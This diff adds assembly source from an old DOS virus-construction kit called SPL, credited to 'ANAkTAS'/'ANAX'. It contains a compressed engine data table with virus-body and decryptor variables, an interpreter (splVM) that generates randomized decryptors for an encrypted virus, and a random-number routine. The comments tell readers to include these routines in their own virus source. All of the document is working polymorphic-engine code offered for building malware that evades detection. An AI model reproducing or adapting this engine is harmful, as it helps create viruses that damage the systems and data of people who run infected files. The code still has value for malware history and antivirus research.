+        DB  002,083,012,007,101,002,012,006,014,000,084,012,005,014,000,234
+        DB  251,247,032,012,005,212,004,032,234,234,251,255,032,012,006,027
+        DB  000,085,012,008,142,002,012,008,145,002,086,234,252,253,251,251
+        DB  255,029,046,255,026,235,255,025,235,062,062,062,234,234,038,234
+        DB  255,031,251,249,000,012,023,168,001,012,013,194,001,012,008,236
+        DB  006,039,234,251,249,128,000,246,039,012,005,193,002,247,039,249
+        DB  004,000,247,024,012,005,035,000,239,246,039,234,251,247,039,249
+        DB  006,000,247,026,249,001,000,241,249,001,000,240,012,008,021,000
+        DB  012,006,035,000,012,009,024,000,238,012,026,045,000,234,255,023
+        DB  255,025,235,255,026,235,251,249,070,012,005,102,000,012,012,012
+        DB  000,012,005,235,000,012,010,059,002,039,012,006,059,002,239,246
+        DB  039,234,245,039,012,008,056,000,000,012,005,050,000,000,234,234
+        DB  251,245,015,251,247,015,012,009,082,001,251,247,019,012,010,134
+        DB  007,012,005,006,005,192,000,247,021,012,005,241,004,000,246,087
+        DB  012,006,234,002,088,012,005,006,006,251,247,019,249,001,000,243
+        DB  246,019,234,251,247,021,249,064,000,012,007,151,002,019,249,001
+        DB  000,242,012,007,021,000,072,012,012,021,000,243,246,019,234,244
+        DB  247,251,247,021,249,208,000,239,236,012,007,011,000,216,012,016
+        DB  055,000,012,011,023,000,012,011,045,000,234,251,251,247,004,246
+        DB  040,234,251,247,019,247,040,243,246,019,234,012,012,152,000,040
+        DB  012,005,005,000,012,007,194,000,251,251,247,004,249,015,000,241
+        DB  012,012,045,000,131,012,014,045,000,012,013,077,000,242,012,006
+        DB  077,000,232,012,037,077,000,242,012,006,077,000,012,012,045,000
+        DB  012,021,113,000,141,255,021,235,235,235,095,235,110,116,125,012
+        DB  007,038,000,234,255,089,012,254,053,001,012,054,053,001,090,012
+        DB  254,053,001,012,053,053,001,234,255,091,012,007,189,008,021,249
+        DB  007,012,006,161,004,247,000,246,092,000,000,012,006,197,008,093
+        DB  000,012,009,221,008,012,012,032,000,094,000,000,234,116,002,012
+        DB  006,054,010,095,012,005,230,003,032,012,005,124,001,012,005,037
+        DB  005,096,012,010,190,007,097,012,006,048,005,012,005,076,005,010
+        DB  012,015,076,005,098,012,010,039,000,099,012,010,087,005,012,005
+        DB  095,000,100,234,255,022,235,251,244,012,005,113,004,247,000,246
+        DB  011,012,005,006,000,101,012,005,006,000,102,234,251,247,000,247
+        DB  007,249,002,000,243,243,246,012,006,176,010,103,012,005,095,000
+        DB  100,012,006,095,000,234,251,251,247,000,247,008,242,246,009,234
+        DB  255,022,251,251,247,101,247,020,242,247,015,242,247,016,242,012
+        DB  005,027,012,012,010,015,000,247,103,247,101,242,243,246,045,012
+        DB  005,190,004,247,020,247,019,243,242,246,046,234,255,028,251,247
+        DB  046,012,005,021,002,046,234,251,247,046,249,002,012,005,010,000
+        DB  012,005,086,000,012,017,059,000,044,012,005,046,000,044,012,005
+        DB  033,002,044,234,251,247,044,249,002,012,005,010,000,012,013,103
+        DB  000,246,045,012,005,038,000,045,012,005,038,000,045,234,251,247
+        DB  045,012,005,038,000,045,012,006,195,012,012,017,120,000,242,012
+        DB  009,120,000,242,012,005,120,000,234,251,247,102,249,003,000,242
+        DB  246,102,012,005,240,006,000,000,012,007,244,000,010,234,080,083
+        DB  086,087,187,245,014,012,009,224,006,012,005,236,006,012,005,024
+        DB  001,249,001,000,237,246,007,234,234,185,245,007,251,247,007,012
+        DB  006,030,000,190,245,006,251,247,006,012,006,012,000,191,245,101
+        DB  251,247,101,012,006,012,000,251,247,000,246,105,234,255,028,172
+        DB  173,012,005,181,006,012,013,168,006,012,013,194,006,012,012,181
+        DB  006,216,255,028,170,171,234,226,251,247,000,246,106,000,234,095
+        DB  094,091,088,203,234,234,234,254,049,235,251,247,049,246,000,247
+        DB  053,247,000,242,249,001,000,242,236,234,234,254,054,235,251,247
+        DB  054,246,000,247,064,012,011,020,000,061,235,251,247,061,246,000
+        DB  247,059,012,011,020,000,063,235,251,247,063,246,000,247,057,012
+        DB  011,020,000,067,235,251,247,067,246,000,247,100,247,000,242,249
+        DB  002,000,242,236,012,006,010,000,001,000,242,012,007,007,003,254
+        DB  068,235,251,247,068,012,029,034,000,070,235,251,247,070,246,000
+        DB  247,050,012,009,034,000,012,005,010,000,012,011,034,000,071,235
+        DB  251,247,071,246,000,247,055,012,009,034,000,012,005,010,000,012
+        DB  011,034,000,073,235,251,247,073,246,000,245,044,247,044,012,008
+        DB  019,000,075,235,251,247,075,012,014,019,000,077,235,251,247,077
+        DB  012,014,019,000,080,235,251,247,080,012,014,019,000,083,235,251
+        DB  247,083,246,000,247,086,012,009,110,000,012,005,010,000,012,011
+        DB  110,000,084,235,251,247,084,012,029,034,000,085,235,251,247,085
+        DB  246,000,247,069,012,009,034,000,012,005,010,000,012,011,034,000
+        DB  087,235,251,247,087,246,000,245,046,247,046,012,008,019,000,092
+        DB  235,251,247,092,246,000,245,045,247,045,012,008,019,000,093,235
+        DB  251,247,093,012,008,106,000,012,007,116,001,094,235,251,247,094
+        DB  012,014,039,000,095,235,251,247,095,012,015,039,000,096,235,251
+        DB  247,096,012,029,121,001,097,235,251,247,097,012,029,034,000,098
+        DB  235,251,247,098,012,029,199,000,099,235,251,247,099,012,029,011
+        DB  001,106,235,251,247,106,246,000,247,105,012,010,156,000,234
+ 
+ 
+;Variables adress map. 
+EXi_IsCOM            equ  10 
+EXi_VirusBodyStart   equ  12 
+EXi_VirusBodyLength  equ  14 
+EXo_DecryptorStart   equ  16 
+EXo_DecryptorVirusLength equ  18 
+EXo_EncryptorOffset  equ  20 
+EXo_EncryptedVirusBodyOffset equ  22 
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[enthelec.inc]컴
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[splvm.inc]컴
+;   SPL for Windows V2.20
+;   (c)1998 by ANAkTAS	   
+;
+;   Description	:
+;   This file contain the <splVM> routine. 
+;   Copy this function to your source file or put the command:
+;   "INCLUDE splVM.inc" in your source file.   
+; ------------------------------------------------------------
+
+
+;;--Usage of registers--
+;;BP=instraction size
+;;AL=current instruction
+;;AH=Return value 
+;;SI=pointer to the current SPL instruction
+;;CX,DX=The math qeue. CX is Math qeue 1, DX is Math qeue 2   
+;;
+;;
+;;Variables
+;;0000 SPL BUFFER POINTER
+;;0002 Math qeue 3 
+;;0004 Math qeue 4
+;;0006 Math qeue 5
+;;0008 randvar
+;------------------------------------------------------
+
+
+;Fuction name:<sple> 
+;Description: The SPL Engine. 
+;Input: 
+;DX:SI  = segment and offset of your engine's data. That's
+;         the data table created by the SPL compiler.        
+;ES:0000= Segment adress of a reserved memory block.
+;	  This is for internal use by splVM. (variables,uncompressed code,etc) 	     
+;    	  This memory block, must first be initialized 
+;         with <splrand> fuction. 
+;DS:0000= Segment adress of the second memory block. 
+;         Its the buffer where your SPL program will put 
+;         the decryptor and possible you would also like 
+;         to put there the encrypted image of your virus.
+;         So, the size of this buffer depents on you.
+;Output:
+;         Registers and Flags are not effected.
+;         DS:0000-???? buffer will contain the generated decryptor.
+;         ES:0000-0511 will contain the variables.
+;         the rest ES:512-???? will contain garbage. 
+;------------------------------------------------------
+splvm    PROC NEAR   
+
+;Save registers AX,BX,CX,DX,SI,DI 
+;( 7 bytes long ) 
+	        PUSHF 
+	        PUSH AX 
+	        PUSH BX 
+	        PUSH CX 
+	        PUSH DX 
+	        PUSH SI 
+	        PUSH DI 
+
+;decompress data table from DX:SI to DS:0200h   
+;( 50 bytes long )
+	        PUSH DS  
+        	PUSH DX  
+        	POP DS  
+		Lodsw
+		mov cx,ax  
+        	MOV DI,512 
+        	MOV DL,DS:[SI] 
+        	INC SI   
+		cld
+spldecompress0:	Lodsw 
+		cmp al,dl
+		jz spldecompress1
+		dec si
+spldecompress2:	stosb
+		loop spldecompress0
+		jmp spldecompress4
+spldecompress1: cmp ah,0
+                jz spldecompress2 
+		mov bx,di
+		sub bx,ds:[si]
+		add si,2
+spldecompress3:	MOV AL,ES:[bx]    
+        	INC bx    
+        	MOV ES:[DI],AL    
+        	INC DI    
+		dec ah 
+                jnz spldecompress3
+		loop spldecompress0  
+spldecompress4:	POP DS    
+        	    
+		PUSH DS  ;exchge DS,ES
+		Push ES
+		POP  DS
+		POP  ES
+
+
+
+
+;initialize registers and call the interpreter 
+	        MOV SI,512
+	        MOV WORD PTR DS:[0],0 ; IP=0 STARTING VALUE
+	        CALL spltranslateinstr 
+		PUSH DS  ;exchge DS,ES
+		Push ES
+		POP  DS
+		POP  ES
+
+;Restore AX,BX,CX,DX,SI.DI 
+	        POP DI 
+	        POP SI 
+	        POP DX 
+	        POP CX 
+	        POP BX 
+	        POP AX 
+	        POPF 
+	        RET  ;exit   
+
+
+spltranslateinstr: 
+		PUSH SI
+                IN AL,40h
+                MOV AH,AL
+                IN AL,40h
+                MOV DS:[0008],AX
+		XOR AH,AH        	               
+		MOV AL,DS:[SI] 
+               
+;decode instruction "ALL"
+splall:		
+	 	CMP AL,251  ;VI_All
+                JNZ splshift  
+                INC SI 
+splall1:	MOV AL,[SI]
+                CMP AL,234  ;VI_End   
+                JnZ  splall2
+		pop si
+		push si
+                jmp splnopping
+splall2:     	call spltranslateinstr 			
+		TEST AH,AH 
+                JZ splall2
+        	CALL splgetinstrsize 
+        	ADD SI,BP 
+        	JMP splall1 
+
+
+;decode instruction "SHIFT"
+splshift:
+	   	CMP AL,253  ;VI_SHIFT 
+                JNZ spliszero  
+		INC SI  
+splshift1:      MOV AL,DS:[SI] 
+		CMP AL,235 ; VI_Noop
+        	JZ splshift3 
+        	CMP AL,250 ;VI_NoopM
+        	JZ splshift3 
+                CMP AL,234  ;VI_End
+                JNZ splshift2
+		pop si
+		push si	
+		jmp splnopping
+splshift2:	call spltranslateinstr 
+		xor ah,ah
+        	POP SI   
+	        RET    
+splshift3:	CALL splgetinstrsize 
+	        ADD SI,BP 
+	        JMP splshift1 
+
+
+;//////////////
+;decode instruction "ISZERO"
+spliszero:
+spl1iszero:	CMP AL,254 ;VI_ISZERO
+        	JNZ splselect  
+		mov DI,ds:[si+1] 
+		and di,00ffh
+		ADD DI,DI
+		MOV AX,DS:[DI]
+		CMP AX,0
+		JZ splselectagain2
+		MOV AL,01
+		JMP splselectagain2
+
+;//////////////
+;decode instruction "SELECT"
+splselect:      
+spl5select:	CMP AL,255 ;VI_SELECT
+        	JNZ splrandom  
+splselectagain:	mov DI,ds:[si+1] 
+		and di,00ffh
+		ADD DI,DI
+		MOV AL,DS:[DI]	         		
+splselectagain2:POP si 
+        	PUSH SI
+        	ADD SI,2
+        	XOR BL,BL 
+splselectnext: 	cmp byte ptr ds:[SI],234 ;VI_End 
+        	jz splselectdiv 
+        	cmp byte ptr ds:[SI],250 ;VI_NoopM
+        	jz splselectpass 
+        	CMP AL,BL  
+        	JZ splselectexec 
+        	INC BL 
+splselectpass:	push ax
+		call splgetinstrsize 
+        	add SI,BP
+		pop ax         	 
+        	JMP splselectnext 
+splselectdiv:	TEST BL,BL 
+        	JnZ splselectdiv2        
+		pop si
+		push si
+		jmp splnopping
+splselectdiv2:  XOR AH,AH 
+		DIV BL  
+        	MOV AL,AH 
+        	JMP splselectagain2 
+splselectexec:	call spltranslateinstr 
+		test ah,ah
+		jz splselectexit 
+		pop si
+		push si
+		jmp splnopping
+splselectexit:  pop si
+		ret
+;//////////////
+
+
+
+
+;decode instruction "RANDOM"
+splrandom:      
+spl5:           CMP AL,252  ;VI_RANDOM
+        	JNZ spl_NoopM  
+		
+spl5again:	IN AL,40h 
+spl5again2:	POP si 
+        	PUSH SI
+        	ADD SI,1
+        	XOR Bx,Bx 
+spl5next: 
+        	cmp byte ptr ds:[SI],234 ;VI_End 
+        	jz spl5div 
+        	cmp byte ptr ds:[SI],250 ;VI_NoopM
+        	jz spl5pass 
+        	cmp byte ptr ds:[SI],235 ;VI_Noop
+        	jz spl5pass 
+        	CMP AL,BL  
+        	JZ spl5exec 
+        	INC BL 
+spl5pass:	push ax
+		call splgetinstrsize 
+        	add SI,BP
+		pop ax         	 
+        	JMP spl5next 
+spl5div:	TEST BL,BL 
+        	JnZ spl5div2        
+		pop si
+		push si
+		jmp splnopping
+spl5div2:      	XOR AH,AH 
+		DIV BL  
+        	MOV AL,AH 
+        	JMP spl5again2 
+spl5exec:	call spltranslateinstr 
+		xor ax,ax
+		pop si
+		ret 
+
+
+;decode instruction "NOOP multiple"
+spl_NoopM:
+spl6:   	CMP AL,250 ;VI_NoopM
+        	JNZ spl_Noop  
+		jmp splnopping
+
+        	
+;decode instruction "NOOP"
+spl_Noop:
+spl7:   	CMP AL,235 ;VI_Noop
+        	JNZ spl_End          	
+		jmp splnopping
+
+
+;decode instruction "END"
+spl_End:
+spl8:   	CMP AL,234 ;VI_End 
+        	JNZ spl_PopVariable      	
+		POP SI
+        	POP SI
+    		POP SI
+		POP SI
+        	PUSH SI
+        	ret
+
+;decode instruction "PopVariable"
+spl_PopVariable:CMP AL,246 ;VI_PopVariable
+        	JNZ spl_Add  
+		MOV DI,DS:[SI+1]
+	        AND DI,00FFh
+		ADD DI,DI 		        	
+        	MOV DS:[DI],CX    
+        	JMP popqeue
+
+
+
+;decode instruction "ADD"
+spl_Add:
+spl11:		CMP AL,243 ;VI_Add
+        	JNZ spl_Sub  
+		ADD DX,CX
+		jmp popqeue        
+        
+
+;decode instruction "SUB"
+spl_Sub:
+spl13:  	CMP AL,242 ;VI_Sub
+        	JNZ spl_Xor  
+		SUB DX,CX
+		jmp popqeue
+
+
+;decode instruction "XOR"
+spl_Xor:
+spl15:  	CMP AL,240 ;VI_XOR
+        	JNZ spl_PopEmit  
+		XOR DX,CX
+        	JMP  popqeue    
+
+;decode instruction "PopEmit"
+spl_PopEmit:
+spl16:  	CMP AL,236 ;VI_PopEmit
+        	JNZ spl_And  
+		MOV DI,DS:[0] 
+        	MOV ES:[DI],CL 
+        	INC WORD PTR DS:[0] 
+        	JMP  popqeue    
+
+;decode instruction "AND"
+spl_And:
+spl17:  	CMP AL,241 ;VI_And
+        	JNZ spl_Or 
+		AND DX,CX
+        	JMP  popqeue   
+
+;decode instruction "OR"
+spl_Or:
+spl18:          CMP AL,239 ;VI_Or
+                JNZ spl_ShiftL		   
+		OR DX,CX
+        	JMP  popqeue 
+
+;decode instruction "Shift left"
+spl_ShiftL:
+spl19:          CMP AL,238 ;VI_ShiftL
+        	JNZ spl_ShiftR  
+		SHL DX,CL
+        	JMP  popqeue 
+
+;decode instruction "Shift right"
+spl_ShiftR:
+spl20:  	CMP AL,237 ;VI_ShiftR
+                JNZ spl_PushValueW  
+		SHR DX,CL		
+        	JMP  popqeue
+
+
+;decode instruction "Push ValueW"
+spl_PushValueW:
+spl21:  	CMP AL,249 ;VI_PushValueW
+        	JNZ spl_PushVariable		
+        	xchg DX,ds:[0002]  ;shift the math queue
+		xchg DX,ds:[0004]
+                mov ds:[0006],DX
+		mov dx,cx
+		MOV CX,DS:[SI+1] ;get the value
+		JMP splnopping
+
+;decode instruction "Push variable"
+spl_PushVariable:
+spl22:  	CMP AL,247 ;VI_PushVariable
+        	JNZ spl_EmitVariable		
+		MOV DI,DS:[SI+1]
+	        AND DI,00FFh
+		ADD DI,DI 		
+        	xchg DX,ds:[0002]  ;shift the math queue
+		xchg DX,ds:[0004]
+                mov ds:[0006],dx
+		mov dx,cx
+		MOV CX,DS:[DI] 
+		JMP splnopping
+
+
+;Pop 1 item from Math queue 
+popqeue:	
+		mov cx,ds:[6]
+                xchg cx,ds:[4]
+                xchg cx,ds:[2]
+                xchg cx,dx
+		JMP splnopping
+
+;decode instruction "EMIT variable"
+spl_EmitVariable:
+spl23:          CMP AL,245   ;VI_EmitVariable
+        	JNZ spl_EmitValueB  
+        	MOV DI,DS:[SI+1]  
+		AND DI,00FFh
+		ADD DI,DI
+		MOV AL,DS:[DI]
+        	JMP spl25 
+
+spl_EmitValueB:
+spl24:  	CMP AL,244 ;VI_EmitValueB
+        	JNZ spl_EmitValueB0  
+        	MOV AL,DS:[SI+1]  
+spl_EmitValueB0:
+spl25:  	MOV DI,DS:[0] 
+        	MOV ES:[DI],AL 
+        	INC WORD PTR DS:[0] 
+        	JMP splnopping 
+
+
+
+
+splnopping: 
+        CALL splgetinstrsize 
+        MOV AH,0FFh
+        DEC BP
+        JZ splonenop 
+	
+        MOV byte PTR DS:[SI],250  ;VI_NoopM 
+	push bp
+splnopinside:
+        MOV BYTE PTR DS:[SI+BP],235  ;VI_Noop	
+	dec bp
+	jnz splnopinside
+	pop bp
+        MOV BYTE PTR DS:[SI+BP],234  ;VI_End
+        JMP splreturn 
+
+splonenop: 
+        MOV BYTE PTR DS:[SI],235  ;VI_Noop
+
+splreturn:
+splreturning: 
+	        POP SI 
+	        RET 
+
+
+
+;BP= returns the size of instruction on DS:[SI]         
+
+splgetinstrsize:  xor di,di
+		  xor bp,bp	
+splgetinstrsize4: mov al,DS:[si+bp]
+		  inc bp
+		  CMP AL,250		
+		  JB splgetinstrsize2
+		  cmp al,254
+		  jnz splgetinstrsize3
+		  inc bp
+splgetinstrsize3: inc di
+splgetinstrsize6: call splgetinstrsize4		  
+		  cmp di,0
+		  jnz splgetinstrsize6		
+		  ret
+
+splgetinstrsize2: cmp al,234
+		  jnz splgetinstrsize5
+		  dec di
+splgetinstrsize5: 
+		  cmp al,244
+		  jb splgetinstrsize1
+		  inc bp
+		  cmp al,249
+		  jb splgetinstrsize1
+		  inc bp
+splgetinstrsize1: ret
+
+
+splvm   ENDP   
+;------------------------------------------------------
+
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[splvm.inc]컴
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[splrand.inc]컴
+;   SPL for Windows V2.00
+;   (c)1997 by ANAX
+;
+;   Description :
+;    This file contain the random generator function "splrand"
+;   Copy this function to your source file or put the command:
+;   "INCLUDE splrand.inc" in your source file.
+; -------------------------------------------------------------
+
+
+
+
+
+
+;------------------------------------------------------
+;Fuction <splrand>
+;The random number generator.
+;You must call this fuction before <sple>.
+;Input:
+;	ES:0000= Segment adress of a memory block.
+;Output:
+;	Registers and Flags are not effected.
+;	The first 256 words (512 bytes) of this block will be used
+;	as variable area. All variables of your engine are located
+;	there. <splrand> sets all variables to random values.
+;
+;------------------------------------------------------
+splrand PROC NEAR
+	PUSHF
+	PUSH AX
+	PUSH BX
+	MOV BX,512
+splrandloop:
+	IN AL,040h
+	XOR ES:[BX-1],AL
+	DEC BX
+	JNZ splrandloop
+	POP BX
+	POP AX
+	POPF
+	RET
+splrand ENDP
+;------------------------------------------------------
+
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[splrand.inc]컴
